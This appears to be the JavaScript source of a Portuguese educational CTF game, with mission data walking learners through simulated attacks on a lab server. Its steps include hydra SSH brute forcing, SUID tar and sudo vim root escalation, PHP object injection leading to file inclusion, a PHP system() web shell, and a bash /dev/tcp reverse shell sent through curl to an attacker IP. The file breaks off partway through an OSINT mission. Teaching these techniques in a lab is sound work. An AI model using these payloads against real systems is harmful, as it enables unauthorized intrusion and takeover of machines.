
/* ============================================================
   CyberOps :: The Breadcrumb Trail
   Motor de jogo educacional CTF — vanilla JS
   ============================================================ */
"use strict";
const reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

/* ---------- MATRIX RAIN ---------- */
(function matrix(){
  const c=document.getElementById('matrix'),x=c.getContext('2d');
  let cols,drops,fontSize=14;
  const glyphs='アカサタナハマヤラ0123456789ABCDEF<>/[]{}#$%=+*';
  function resize(){c.width=innerWidth;c.height=innerHeight;cols=Math.floor(c.width/fontSize);
    drops=Array(cols).fill(0).map(()=>Math.random()*-50);}
  resize();addEventListener('resize',resize);
  function draw(){
    x.fillStyle='rgba(5,8,10,0.09)';x.fillRect(0,0,c.width,c.height);
    x.font=fontSize+'px monospace';
    for(let i=0;i<cols;i++){
      const ch=glyphs[Math.floor(Math.random()*glyphs.length)];
      const y=drops[i]*fontSize;
      x.fillStyle=Math.random()<0.02?'#5fffba':'#1c7d56';
      x.fillText(ch,i*fontSize,y);
      if(y>c.height&&Math.random()>0.975)drops[i]=0; drops[i]++;
    }
  }
  if(!reduce) setInterval(draw,55);
})();

/* ---------- helpers ---------- */
const $=s=>document.querySelector(s);
const el=(t,c,h)=>{const e=document.createElement(t);if(c)e.className=c;if(h!=null)e.innerHTML=h;return e;};
const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const sleep=ms=>new Promise(r=>setTimeout(r,ms));

/* ============================================================
   DADOS DAS MISSÕES
   ============================================================ */
const TARGET="10.1.2.69";
const MISSIONS=[
{
  id:"NOA-WEB-01", code:"WEB", title:"O Caso WordPress", track:"red", domain:"D2",
  blurb:"O portal beta do IPB corre WordPress atrás de um vhost esquecido. Enumera, encontra credenciais perdidas e escala até root.",
  tags:["nmap","dirb","hydra","SSH","SUID"],
  intro:[
    {t:"sys",x:"[ DOSSIÊ ] Alvo: servidor web "+TARGET+" — exposto na DMZ do Instituto Politécnico de Bragança."},
    {t:"sys",x:"[ DOSSIÊ ] Suspeita: um vhost de desenvolvimento ('wp.looz.com') deixado online com credenciais reutilizadas."},
    {t:"sys",x:"[ OBJETIVO ] Capturar user.txt e root.txt. Mantém o ruído baixo — lê a teoria antes de disparar comandos."}
  ],
  steps:[
    {
      type:"command", n:"recon", short:"Reconhecimento",
      eyebrow:"Fase 01 · Reconhecimento",
      title:"Mapear a superfície de ataque",
      dossier:`<p class="lead">Não se ataca o que não se conhece. Antes de qualquer exploração, mapeamos que serviços respondem no alvo e em que versão.</p>
        <p>O <b>nmap</b> envia pacotes a cada porta e interpreta as respostas. Cada porta aberta é um serviço potencialmente vulnerável — uma <i>porta da frente</i> diferente.</p>`,
      concepts:[
        {term:"Porta TCP & Enumeração",status:"conceito",
         body:`Uma <b>porta TCP</b> é um número (0–65535) onde um serviço escuta. SSH costuma estar na 22, HTTP na 80. <b>Enumerar</b> é listar tudo o que está ativo antes de decidir por onde entrar.`},
        {term:"Parâmetro <span class='cmd'>-sV</span> (deteção de versão)",status:"comando",gate:true,
         body:`O <code>-sV</code> faz o nmap dialogar com cada serviço para descobrir a <b>versão exata</b> — essencial para procurar exploits conhecidos. Junta <code>-p-</code> para varrer as 65535 portas.`,
         load:"nmap -sV "}
      ],
      hint:"nmap -sV "+TARGET,
      test:c=>/nmap/.test(c)&&/-sv/i.test(c)&&c.includes(TARGET),
      output:()=>[
        {t:"sys",x:"Starting Nmap 7.94 ( https://nmap.org )"},
        {t:"sys",x:"Scanning "+TARGET+" [65535 ports]"},
        {t:"line",x:"PORT     STATE  SERVICE  VERSION"},
        {t:"good",x:"22/tcp   open   ssh      OpenSSH 8.2p1 Ubuntu"},
        {t:"good",x:"80/tcp   open   http     Apache httpd 2.4.41"},
        {t:"warnline",x:"|_http-title: Did not follow redirect to http://wp.looz.com/"},
        {t:"sys",x:"Nmap done: 1 IP address (1 host up) scanned"}
      ],
      reveal:"O servidor redireciona para o domínio wp.looz.com — mas o teu DNS não o resolve."
    },
    {
      type:"command", n:"vhost", short:"Vhost",
      eyebrow:"Fase 02 · Resolução de nome",
      title:"Ensinar o domínio à tua máquina",
      dossier:`<p class="lead">O servidor responde de forma diferente consoante o nome pedido — chama-se <b>virtual hosting</b>. Sem o nome certo, vês a página errada.</p>
        <p>Como não há DNS público para <code>wp.looz.com</code>, mapeamos o domínio ao IP localmente no ficheiro <code>/etc/hosts</code>.</p>`,
      concepts:[
        {term:"Virtual Hosting & <span class='cmd'>/etc/hosts</span>",status:"comando",gate:true,
         body:`Um só IP pode servir vários sites. O servidor escolhe qual mostrar pelo cabeçalho <code>Host:</code>. O ficheiro <code>/etc/hosts</code> resolve nomes localmente, antes de qualquer DNS — escrevendo <code>IP nome</code> numa linha.`,
         load:'echo "'+TARGET+' wp.looz.com" >> /etc/hosts'}
      ],
      hint:'echo "'+TARGET+' wp.looz.com" >> /etc/hosts',
      test:c=>(/\/etc\/hosts/.test(c))&&c.includes("wp.looz.com")&&c.includes(TARGET),
      output:()=>[
        {t:"good",x:"[+] /etc/hosts atualizado."},
        {t:"sys",x:"wp.looz.com -> "+TARGET+"  (resolve localmente)"}
      ],
      reveal:"Agora wp.looz.com resolve. Hora de procurar diretórios escondidos."
    },
    {
      type:"command", n:"dirb", short:"Diretórios",
      eyebrow:"Fase 03 · Mapeamento de conteúdo",
      title:"Forçar diretórios ocultos",
      dossier:`<p class="lead">Nem tudo está ligado a partir da homepage. Páginas de admin e backups ficam acessíveis se souberes o caminho.</p>
        <p>O <b>dirb</b> testa milhares de nomes comuns de uma <b>wordlist</b> contra o servidor e regista os que respondem 200/301.</p>`,
      concepts:[
        {term:"Força bruta de diretórios",status:"conceito",
         body:`Em vez de adivinhar à mão, automatizamos: para cada palavra da lista, faz-se um pedido HTTP. Códigos <code>200</code> (existe) e <code>301</code> (redireciona) revelam recursos escondidos.`},
        {term:"Wordlist <span class='cmd'>common.txt</span>",status:"comando",gate:true,
         body:`A <code>common.txt</code> do dirb traz os nomes mais frequentes (admin, backup, dev, secret…). Aponta o dirb ao alvo seguido do caminho da wordlist.`,
         load:"dirb http://wp.looz.com /usr/share/wordlists/dirb/common.txt"}
      ],
      hint:"dirb http://wp.looz.com /usr/share/wordlists/dirb/common.txt",
      test:c=>/dirb|gobuster|ffuf/.test(c)&&c.includes("wp.looz.com"),
      output:()=>[
        {t:"sys",x:"DIRB v2.22 — scanning http://wp.looz.com/"},
        {t:"line",x:"+ http://wp.looz.com/index.php       (CODE:301)"},
        {t:"line",x:"+ http://wp.looz.com/wp-admin/       (CODE:301)"},
        {t:"line",x:"+ http://wp.looz.com/wp-content/     (CODE:301)"},
        {t:"good",x:"+ http://wp.looz.com/dev-notes.html  (CODE:200)  <-- inesperado"},
        {t:"sys",x:"DOWNLOADED: 4612 — FOUND: 4"}
      ],
      reveal:"'dev-notes.html' não devia estar público. Inspeciona o código-fonte."
    },
    {
      type:"command", n:"curl", short:"Source",
      eyebrow:"Fase 04 · Information Disclosure",
      title:"Ler o que ficou esquecido no HTML",
      dossier:`<p class="lead">Programadores deixam pistas em comentários: TODOs, credenciais de teste, caminhos internos. O navegador esconde-os, mas estão no código.</p>
        <p>O <b>curl</b> descarrega o HTML em bruto, comentários incluídos. É a forma mais rápida de inspecionar o source de uma página.</p>`,
      concepts:[
        {term:"Information Disclosure",status:"conceito",
         body:`Falha em que o sistema revela informação sensível sem querer — neste caso, um comentário HTML <code>&lt;!-- ... --&gt;</code> com dados que nunca deviam sair de produção.`},
        {term:"Inspecionar source com <span class='cmd'>curl</span>",status:"comando",gate:true,
         body:`<code>curl URL</code> imprime o corpo da resposta tal como o servidor o envia. Combina com <code>grep</code> para filtrar, mas começa por ler tudo.`,
         load:"curl http://wp.looz.com/dev-notes.html"}
      ],
      hint:"curl http://wp.looz.com/dev-notes.html",
      test:c=>/curl|wget/.test(c)&&c.includes("wp.looz.com"),
      output:()=>[
        {t:"line",x:"<html><head><title>Dev Notes</title></head><body>"},
        {t:"line",x:"<h1>Notas internas - NAO PUBLICAR</h1>"},
        {t:"warnline",x:"<!-- john: criei o user wp 'gandalf'. reutilizei a pass do SSH. trocar antes do lancamento -->"},
        {t:"line",x:"</body></html>"}
      ],
      reveal:"'john' confessa: o utilizador 'gandalf' reutiliza a mesma password no SSH. Vamos quebrá-la."
    },
    {
      type:"command", n:"hydra", short:"Brute SSH",
      eyebrow:"Fase 05 · Ataque de dicionário",
      title:"Quebrar a password do SSH",
      dossier:`<p class="lead">Sabemos o utilizador (<code>gandalf</code>) e que a password é fraca/reutilizada. Falta testar candidatos contra o serviço SSH.</p>
        <p>O <b>hydra</b> automatiza tentativas de login. Com a wordlist <code>rockyou.txt</code> (milhões de passwords vazadas) os clássicos caem em segundos.</p>`,
      concepts:[
        {term:"Ataque de dicionário",status:"conceito",
         body:`Diferente de força bruta pura: testa apenas passwords <b>prováveis</b> de uma lista, em vez de todas as combinações. Muito mais rápido quando os utilizadores escolhem mal.`},
        {term:"<span class='cmd'>hydra</span> + <span class='cmd'>rockyou.txt</span>",status:"comando",gate:true,
         body:`<code>hydra -l USER -P LISTA ssh://IP</code>. O <code>-l</code> fixa o utilizador, o <code>-P</code> aponta à wordlist. A <code>rockyou.txt</code> vive em <code>/usr/share/wordlists/</code>.`,
         load:"hydra -l gandalf -P /usr/share/wordlists/rockyou.txt ssh://"+TARGET}
      ],
      hint:"hydra -l gandalf -P /usr/share/wordlists/rockyou.txt ssh://"+TARGET,
      test:c=>/hydra/.test(c)&&/gandalf/.test(c)&&/rockyou/.test(c)&&/ssh/.test(c),
      output:()=>[
        {t:"sys",x:"Hydra v9.5 — attacking ssh://"+TARGET+":22"},
        {t:"sys",x:"[DATA] 16 tasks, ~3.2M tries..."},
        {t:"good",x:"[22][ssh] host: "+TARGET+"  login: gandalf  password: shadowfax1973"},
        {t:"good",x:"1 of 1 target successfully completed, 1 valid password found"}
      ],
      reveal:"Credenciais: gandalf : shadowfax1973. Entra por SSH."
    },
    {
      type:"command", n:"ssh", short:"Acesso",
      eyebrow:"Fase 06 · Acesso inicial",
      title:"Estabelecer sessão SSH",
      dossier:`<p class="lead">Com credenciais válidas, ganhamos uma shell legítima na máquina. É o pé na porta para o resto da operação.</p>
        <p>O <b>ssh</b> abre um terminal remoto cifrado. A partir daqui, comandos correm <i>dentro</i> do alvo.</p>`,
      concepts:[
        {term:"Sessão <span class='cmd'>ssh</span> & <span class='cmd'>user.txt</span>",status:"comando",gate:true,
         body:`<code>ssh utilizador@IP</code> e a password descoberta. A flag de utilizador costuma estar em <code>~/user.txt</code> — lê com <code>cat</code>.`,
         load:"ssh gandalf@"+TARGET}
      ],
      hint:"ssh gandalf@"+TARGET+"   →   depois:  cat user.txt",
      test:c=>/ssh\s+gandalf@/.test(c)&&c.includes(TARGET),
      output:()=>[
        {t:"sys",x:"gandalf@"+TARGET+"'s password: ************"},
        {t:"good",x:"Welcome to Ubuntu 20.04.6 LTS"},
        {t:"sys",x:"gandalf@web01:~$ cat user.txt"}
      ],
      ctx:"gandalf@web01",
      flag:"FLAG{IPB_WP_us3r_d150_pt}",
      reveal:"Dentro da máquina como 'gandalf'. user.txt capturada!",
      summary:{tecnica:"Cadeia de acesso web→SSH",vetor:"Information disclosure + reutilização de password",ferramentas:"nmap, dirb, curl, hydra, ssh",licao:"Comentários em HTML e passwords reutilizadas dão acesso direto. Nunca reutilizar credenciais entre serviços."}
    },
    {
      type:"command", n:"suid", short:"SUID",
      eyebrow:"Fase 07 · Escalada de privilégios",
      title:"Caçar binários SUID",
      dossier:`<p class="lead">'gandalf' é utilizador comum. Para chegar a root procuramos um programa que corra com privilégios elevados — uma alavanca.</p>
        <p>Binários com o bit <b>SUID</b> executam com as permissões do dono (frequentemente root). Se um deles for explorável, herdamos esse poder.</p>`,
      concepts:[
        {term:"O bit SUID",status:"conceito",
         body:`Quando um ficheiro tem SUID, corre como o seu <b>dono</b>, não como quem o executa. Um SUID mal configurado e propriedade do root é uma porta direta para privilégios totais.`},
        {term:"Encontrar SUIDs com <span class='cmd'>find</span>",status:"comando",gate:true,
         body:`<code>find / -perm -4000 2&gt;/dev/null</code> percorre todo o sistema à procura do bit SUID (4000), silenciando erros de permissão.`,
         load:"find / -perm -4000 2>/dev/null"}
      ],
      hint:"find / -perm -4000 2>/dev/null",
      test:c=>/find/.test(c)&&/-perm/.test(c)&&/4000/.test(c),
      output:()=>[
        {t:"line",x:"/usr/bin/passwd"},
        {t:"line",x:"/usr/bin/sudo"},
        {t:"good",x:"/opt/backup/tar   <-- SUID + propriedade root, fora do padrão"},
        {t:"sys",x:"GTFOBins: tar pode invocar uma shell mantendo o UID do dono."}
      ],
      reveal:"O 'tar' em /opt/backup corre como root e pode lançar uma shell."
    },
    {
      type:"command", n:"root", short:"Root",
      eyebrow:"Fase 08 · Comprometimento total",
      title:"Tornar-se root",
      dossier:`<p class="lead">O <b>GTFOBins</b> documenta binários legítimos que podem ser abusados para escalar. O <code>tar</code> tem um truque conhecido: usar a opção de checkpoint para correr um comando.</p>
        <p>Como o binário é SUID-root, esse comando — uma shell — herda os privilégios de root.</p>`,
      concepts:[
        {term:"GTFOBins & <span class='cmd'>tar</span> → root",status:"comando",gate:true,
         body:`Abusa-se o <code>--checkpoint</code> do tar para executar <code>/bin/sh</code> como root:<br><code>tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh</code>. Depois lê <code>/root/root.txt</code>.`,
         load:"tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh"}
      ],
      hint:"tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh   →   cat /root/root.txt",
      test:c=>/tar/.test(c)&&/checkpoint-action/.test(c)&&/exec=/.test(c),
      output:()=>[
        {t:"good",x:"# id"},
        {t:"good",x:"uid=0(root) gid=0(root) groups=0(root)"},
        {t:"sys",x:"# cat /root/root.txt"}
      ],
      ctx:"root@web01",
      flag:"FLAG{IPB_r00t_SU1D_tar_pwn}",
      reveal:"ROOT! Controlo total da máquina. root.txt capturada!",
      summary:{tecnica:"Escalada de privilégios local",vetor:"Binário SUID abusável (GTFOBins)",ferramentas:"find, tar",licao:"Binários SUID-root personalizados são um risco crítico. Auditar permissões com regularidade."}
    }
  ]
},
/* ===================== MISSÃO 2 ===================== */
{
  id:"NOA-WEB-02", code:"PHP", title:"Cookie Beta Test", track:"red", domain:"D2",
  blurb:"Uma app beta serializa objetos PHP nos cookies. Identifica a linha vulnerável, força um LFI e transforma-o em execução remota de código.",
  tags:["Base64","PHP Object Injection","LFI","RCE","Reverse Shell"],
  intro:[
    {t:"sys",x:"[ DOSSIÊ ] App interna 'BetaTest' guarda a sessão num cookie serializado em Base64."},
    {t:"sys",x:"[ DOSSIÊ ] O código-fonte vazou. As classes User e Log estão expostas — uma delas inclui ficheiros dinamicamente."},
    {t:"sys",x:"[ OBJETIVO ] PHP Object Injection → LFI → RCE → reverse shell → user.txt, e depois root via sudo."}
  ],
  steps:[
    {
      type:"inspect", n:"audit", short:"Auditoria",
      eyebrow:"Fase 01 · Auditoria de código",
      title:"Encontrar a linha vulnerável",
      dossier:`<p class="lead">Antes de explorar, lemos o código. A vulnerabilidade de <b>PHP Object Injection</b> nasce de combinar <code>unserialize()</code> com um <i>magic method</i> que faz algo perigoso.</p>
        <p>Clica na linha que permite incluir um ficheiro arbitrário a partir de uma propriedade controlada pelo atacante.</p>`,
      code:[
        {c:'<span class="kw">class</span> <span class="fn">User</span> {'},
        {c:'  <span class="kw">public</span> $username;'},
        {c:'  <span class="kw">public</span> $isAdmin = <span class="kw">false</span>;'},
        {c:'}'},
        {c:''},
        {c:'<span class="kw">class</span> <span class="fn">Log</span> {'},
        {c:'  <span class="kw">public</span> $type_log = <span class="str">"access.log"</span>;'},
        {c:'  <span class="kw">function</span> <span class="fn">__wakeup</span>() {'},
        {c:'    <span class="fn">include</span>($this-&gt;type_log);', bad:true},
        {c:'  }'},
        {c:'}'},
        {c:''},
        {c:'$obj = <span class="fn">unserialize</span>(<span class="fn">base64_decode</span>($_COOKIE[<span class="str">"session"</span>]));'}
      ],
      badLine:8,
      successReveal:"Exato: include($this->type_log) dentro de __wakeup(). Se controlarmos type_log, controlamos que ficheiro o servidor inclui.",
      failReveal:"Essa linha é inofensiva. Procura onde uma propriedade controlável alimenta um include().",
      flag:null
    },
    {
      type:"command", n:"decode", short:"Decode",
      eyebrow:"Fase 02 · Anatomia do cookie",
      title:"Descodificar o cookie Base64",
      dossier:`<p class="lead">O cookie parece aleatório, mas é só <b>Base64</b>. Descodificar revela a estrutura do objeto serializado.</p>
        <p>O <b>Base64</b> não é cifra — é codificação reversível. Qualquer um a desfaz.</p>`,
      concepts:[
        {term:"Base64 com <span class='cmd'>base64 -d</span>",status:"comando",gate:true,
         body:`<code>echo "COOKIE" | base64 -d</code> imprime o conteúdo original. Vais ver a serialização PHP: <code>O:3:"Log":...</code>.`,
         load:'echo "Tzo zOiJMb2ciOjE6e3M6ODoidHlwZV9sb2ciO3M6MTA6ImFjY2Vzcy5sb2ciO30=" | base64 -d'.replace(" z","z")}
      ],
      hint:'echo "<cookie>" | base64 -d',
      test:c=>/base64/.test(c)&&/-d|--decode/.test(c),
      output:()=>[
        {t:"good",x:'O:3:"Log":1:{s:8:"type_log";s:10:"access.log";}'},
        {t:"sys",x:"É um objeto Log com a propriedade type_log = access.log"}
      ],
      reveal:"Confirmado: o cookie é um objeto Log serializado. Vamos trocar 'access.log' por algo mais interessante."
    },
    {
      type:"command", n:"lfi", short:"LFI",
      eyebrow:"Fase 03 · Local File Inclusion",
      title:"Forjar o objeto para ler /etc/passwd",
      dossier:`<p class="lead">Se mudarmos <code>type_log</code> para <code>/etc/passwd</code> e voltarmos a serializar+codificar, o <code>__wakeup()</code> vai incluir esse ficheiro — um <b>LFI</b>.</p>
        <p>Forjamos o objeto, codificamos em Base64 e enviamos como cookie de sessão.</p>`,
      concepts:[
        {term:"PHP Object Injection → LFI",status:"conceito",
         body:`Ao controlar o objeto desserializado, controlamos as suas propriedades. Aqui <code>type_log</code> torna-se o caminho do <code>include()</code> — leitura arbitrária de ficheiros.`},
        {term:"Forjar e codificar o payload",status:"comando",gate:true,
         body:`Constrói a string serializada com o caminho-alvo e codifica:<br><code>echo -n 'O:3:"Log":1:{s:8:"type_log";s:11:"/etc/passwd";}' | base64</code>.`,
         load:`echo -n 'O:3:"Log":1:{s:8:"type_log";s:11:"/etc/passwd";}' | base64`}
      ],
      hint:`echo -n 'O:3:"Log":1:{s:8:"type_log";s:11:"/etc/passwd";}' | base64`,
      test:c=>/base64/.test(c)&&/etc\/passwd/.test(c),
      output:()=>[
        {t:"good",x:"Cookie forjado -> enviado como session=..."},
        {t:"sys",x:"--- resposta do servidor (include /etc/passwd) ---"},
        {t:"line",x:"root:x:0:0:root:/root:/bin/bash"},
        {t:"warnline",x:"beta:x:1001:1001:beta tester:/home/beta:/bin/bash"},
        {t:"sys",x:"Há um utilizador 'beta'. Podemos ir além de ler ficheiros."}
      ],
      reveal:"LFI confirmado: lemos /etc/passwd. Próximo passo — transformar leitura em execução."
    },
    {
      type:"command", n:"listen", short:"Listener",
      eyebrow:"Fase 04 · Preparar a receção",
      title:"Abrir um listener para a reverse shell",
      dossier:`<p class="lead">Vamos fazer o servidor executar código que se liga <i>de volta</i> a nós. Primeiro precisamos de algo à escuta para apanhar essa ligação.</p>
        <p>O <b>netcat</b> (<code>nc</code>) abre uma porta local e espera. Quando a reverse shell chegar, ficamos com um terminal do alvo.</p>`,
      concepts:[
        {term:"Reverse shell & <span class='cmd'>nc -lvnp</span>",status:"comando",gate:true,
         body:`Numa <b>reverse shell</b> é o alvo que se liga a ti (atravessa firewalls de saída). <code>nc -lvnp 4444</code>: <b>l</b>isten, <b>v</b>erbose, <b>n</b> sem DNS, <b>p</b>orta 4444.`,
         load:"nc -lvnp 4444"}
      ],
      hint:"nc -lvnp 4444",
      test:c=>/nc|ncat|netcat/.test(c)&&/-l/.test(c)&&/4444|\d{3,5}/.test(c),
      output:()=>[
        {t:"sys",x:"listening on [any] 4444 ..."},
        {t:"sys",x:"(à espera de ligação do alvo — dispara o payload no próximo passo)"}
      ],
      reveal:"Listener ativo na porta 4444. Agora envenenamos um log e incluímo-lo para executar código."
    },
    {
      type:"command", n:"rce", short:"RCE",
      eyebrow:"Fase 05 · Remote Code Execution",
      title:"Disparar a reverse shell",
      dossier:`<p class="lead">Combinando o LFI com um ficheiro que contém PHP (um log envenenado ou um wrapper), o <code>include()</code> deixa de só ler — passa a <b>executar</b>.</p>
        <p>Injetamos um payload que invoca <code>bash</code> a ligar-se ao nosso listener. É a transição LFI → RCE.</p>`,
      concepts:[
        {term:"LFI → RCE",status:"conceito",
         body:`Se o ficheiro incluído contiver código PHP, o servidor executa-o. Envenena-se um log com <code>&lt;?php system($_GET['c']); ?&gt;</code> e inclui-se — agora corremos comandos.`},
        {term:"Disparar o payload",status:"comando",gate:true,
         body:`Pede ao servidor que inclua o log envenenado a executar uma reverse shell:<br><code>curl "http://beta.looz.com/?c=bash -c 'bash -i &gt;%26 /dev/tcp/SEU_IP/4444 0&gt;%261'"</code>.`,
         load:`curl "http://beta.looz.com/?c=bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'"`}
      ],
      hint:`curl "http://beta.looz.com/?c=bash -i >& /dev/tcp/<seu_ip>/4444 0>&1"`,
      test:c=>/curl/.test(c)&&/4444|tcp/.test(c)&&/bash|sh/.test(c),
      output:()=>[
        {t:"good",x:"connect to [10.10.10.5] from (UNKNOWN) [10.1.2.69] 51344"},
        {t:"good",x:"bash: cannot set terminal process group: Inappropriate ioctl"},
        {t:"sys",x:"beta@beta01:/var/www$ id"},
        {t:"good",x:"uid=1001(beta) gid=1001(beta) groups=1001(beta)"},
        {t:"sys",x:"beta@beta01:/var/www$ cat /home/beta/user.txt"}
      ],
      ctx:"beta@beta01",
      flag:"FLAG{PHP_0bj3ct_1nj3ct10n_RCE}",
      reveal:"Reverse shell recebida como 'beta'. user.txt capturada!",
      summary:{tecnica:"PHP Object Injection → RCE",vetor:"unserialize() inseguro em cookie + include() dinâmico",ferramentas:"base64, nc, curl",licao:"Nunca desserializar dados controlados pelo cliente. Validar e nunca incluir caminhos a partir de input."}
    },
    {
      type:"command", n:"sudo", short:"Sudo",
      eyebrow:"Fase 06 · Escalada via sudo",
      title:"Verificar permissões sudo",
      dossier:`<p class="lead">Antes de root, perguntamos: o que é que 'beta' pode correr como root? Uma má configuração de <code>sudo</code> costuma ser o atalho.</p>
        <p><code>sudo -l</code> lista o que o utilizador pode executar com privilégios — sem precisar da password de root.</p>`,
      concepts:[
        {term:"<span class='cmd'>sudo -l</span> & má configuração",status:"comando",gate:true,
         body:`<code>sudo -l</code> mostra regras como <code>(root) NOPASSWD: /usr/bin/vim</code>. Editores e interpretadores nessa lista permitem fugir para uma shell root.`,
         load:"sudo -l"}
      ],
      hint:"sudo -l",
      test:c=>/sudo/.test(c)&&/-l\b/.test(c),
      output:()=>[
        {t:"sys",x:"Matching Defaults entries for beta on beta01:"},
        {t:"line",x:"User beta may run the following commands:"},
        {t:"good",x:"    (root) NOPASSWD: /usr/bin/vim"},
        {t:"sys",x:"GTFOBins: vim pode lançar uma shell com :!/bin/bash"}
      ],
      reveal:"'beta' pode correr vim como root sem password. O vim sabe abrir uma shell."
    },
    {
      type:"command", n:"vimroot", short:"Root",
      eyebrow:"Fase 07 · Root via GTFOBins",
      title:"Fugir do vim para root",
      dossier:`<p class="lead">Editores como o <b>vim</b> conseguem lançar comandos do sistema. Se o vim corre como root, a shell que ele abre também corre.</p>
        <p>É o padrão <b>GTFOBins</b>: usar uma funcionalidade legítima de forma maliciosa.</p>`,
      concepts:[
        {term:"<span class='cmd'>sudo vim</span> → <span class='cmd'>:!/bin/bash</span>",status:"comando",gate:true,
         body:`Lança o vim como root e, dentro dele, executa <code>:!/bin/bash</code> para abrir uma shell root. Em uma linha: <code>sudo vim -c ':!/bin/bash'</code>.`,
         load:"sudo vim -c ':!/bin/bash'"}
      ],
      hint:"sudo vim -c ':!/bin/bash'   →   cat /root/root.txt",
      test:c=>/sudo/.test(c)&&/vim/.test(c)&&/bash|sh/.test(c),
      output:()=>[
        {t:"good",x:"# id"},
        {t:"good",x:"uid=0(root) gid=0(root) groups=0(root)"},
        {t:"sys",x:"# cat /root/root.txt"}
      ],
      ctx:"root@beta01",
      flag:"FLAG{GTF0B1ns_v1m_sud0_r00t}",
      reveal:"ROOT via vim! Máquina totalmente comprometida.",
      summary:{tecnica:"Escalada de privilégios via sudo",vetor:"sudo NOPASSWD num binário GTFOBins (vim)",ferramentas:"sudo, vim",licao:"Regras sudo devem evitar editores/interpretadores. Princípio do menor privilégio."}
    }
  ]
},
/* ===================== MISSÃO 3 ===================== */
{
  id:"NOA-OSINT-03", code:"OSINT", title:"As Pegadas de Marco Ribeiro", track:"red", domain:"D2",
  blurb:"Segue o rasto digital de Marco Ribeiro: esteganografia numa foto, commits apagados num Gitea, um subdomínio secreto no DNS e uma cifra de César a guardar a flag final.",
  tags:["Esteganografia","Geolocalização","Git","dig","Cifra de César"],
  intro:[
    {t:"sys",x:"[ DOSSIÊ ] Alvo OSINT: 'Marco Ribeiro', ex-colaborador. Deixou pegadas em fotos, repositórios e DNS."},
    {t:"sys",x:"[ DOSSIÊ ] Tudo é fonte aberta — não há exploração de sistemas, só investigação e correlação."},
    {t:"sys",x:"[ OBJETIVO ] Recuperar um ficheiro protegido, chaves de API apagadas e decifrar a flag final."}
  ],
  steps:[
    {
      type:"command", n:"meta", short:"Metadados",
      eyebrow:"Fase 01 · Análise de imagem",
      title:"Extrair metadados e dados ocultos",
      dossier:`<p class="lead">Fotos guardam mais do que pixels: GPS, modelo da câmara, comentários — os <b>metadados EXIF</b>. E podem esconder dados via <b>esteganografia</b>.</p>
        <p>Começa por ler os metadados da foto que o Marco publicou.</p>`,
      concepts:[
        {term:"Metadados EXIF",status:"conceito",
         body:`Campos embebidos no ficheiro: data, GPS, dispositivo, comentários. Muita gente partilha fotos sem saber que carregam a sua localização exata.`},
        {term:"<span class='cmd'>exiftool</span> & <span class='cmd'>steghide</span>",status:"comando",gate:true,
         body:`<code>exiftool foto.jpg</code> despeja todos os campos. Se houver dados escondidos no pixel, <code>steghide extract -sf foto.jpg</code> recupera-os.`,
         load:"exiftool foto_marco.jpg"}
      ],
      hint:"exiftool foto_marco.jpg   (depois: steghide extract -sf foto_marco.jpg)",
      test:c=>/exiftool|strings|steghide/.test(c)&&/foto_marco|\.jpg/.test(c),
      output:()=>[
        {t:"line",x:"Camera Model      : iPhone 13"},
        {t:"warnline",x:"GPS Position      : 41.1496 N, 8.6109 W"},
        {t:"line",x:"User Comment      : pista -> o nome do jardim e a password do zip"},
        {t:"good",x:"steghide: extraído 'cofre.zip' (protegido por password)"}
      ],
      reveal:"Coordenadas 41.1496, -8.6109 e um ZIP protegido. A password é o nome do jardim nesse ponto."
    },
    {
      type:"answer", n:"geo", short:"Geo",
      eyebrow:"Fase 02 · Geolocalização",
      title:"Identificar o local e abrir o cofre",
      dossier:`<p class="lead">As coordenadas <code>41.1496 N, 8.6109 W</code> apontam para um jardim panorâmico sobre o Douro, no Porto, com vista para a Ribeira.</p>
        <p>Reverte as coordenadas (Google Maps/Lens) e escreve o nome do jardim — é a password do ZIP.</p>`,
      answerLabel:"Nome do jardim (password do ZIP):",
      answerHint:"Jardim com miradouro sobre o Douro, em Vila Nova de Gaia/Porto. Duas palavras após 'Jardim do…'.",
      accept:["jardim do morro","morro","jardim do morro porto"],
      successReveal:"Correto — Jardim do Morro. Cofre aberto. Lá dentro: a referência a um servidor Gitea privado do Marco.",
      failReveal:"Não bate certo. Reverte as coordenadas num mapa e procura o jardim com miradouro sobre o Douro.",
      flag:null
    },
    {
      type:"command", n:"git", short:"Git",
      eyebrow:"Fase 03 · História do Git",
      title:"Recuperar segredos apagados",
      dossier:`<p class="lead">Apagar um ficheiro e fazer commit <b>não</b> o remove da história. O Git guarda tudo — basta olhar para commits antigos.</p>
        <p>Clonado o repositório do Gitea, percorremos a história à procura do <code>.env</code> que o Marco julgou ter eliminado.</p>`,
      concepts:[
        {term:"História imutável do Git",status:"conceito",
         body:`Cada commit é um snapshot. Remover um ficheiro num commit posterior não apaga as versões anteriores — continuam acessíveis por hash.`},
        {term:"<span class='cmd'>git log</span> & <span class='cmd'>git show</span>",status:"comando",gate:true,
         body:`<code>git log --all --oneline</code> lista todos os commits. <code>git show &lt;hash&gt;</code> mostra o que mudou — incluindo ficheiros depois apagados.`,
         load:"git log --all --oneline"}
      ],
      hint:"git log --all --oneline   →   git show <hash>",
      test:c=>/git/.test(c)&&/(log|show|checkout|cat-file)/.test(c),
      output:()=>[
        {t:"line",x:"a1f9c2e (HEAD) limpeza: remover .env  <-- apagou aqui"},
        {t:"warnline",x:"7b3d810 add config inicial com .env"},
        {t:"sys",x:"$ git show 7b3d810:.env"},
        {t:"good",x:"API_KEY=sk_live_4f8e2a9c  DNS_DOMAIN=marcoribeiro.pt"},
        {t:"sys",x:"O .env aponta para o domínio marcoribeiro.pt"}
      ],
      reveal:"Chave de API recuperada e um domínio: marcoribeiro.pt. Vamos enumerar o seu DNS."
    },
    {
      type:"command", n:"dns", short:"DNS",
      eyebrow:"Fase 04 · Enumeração DNS",
      title:"Caçar o subdomínio secreto",
      dossier:`<p class="lead">O DNS guarda registos além dos visíveis. Subdomínios começados por <code>_</code> (underscore) costumam ser internos/escondidos.</p>
        <p>Consultamos o registo TXT de um subdomínio que o <code>.env</code> sugeria: <code>_secret.marcoribeiro.pt</code>.</p>`,
      concepts:[
        {term:"Registos DNS & subdomínios _",status:"conceito",
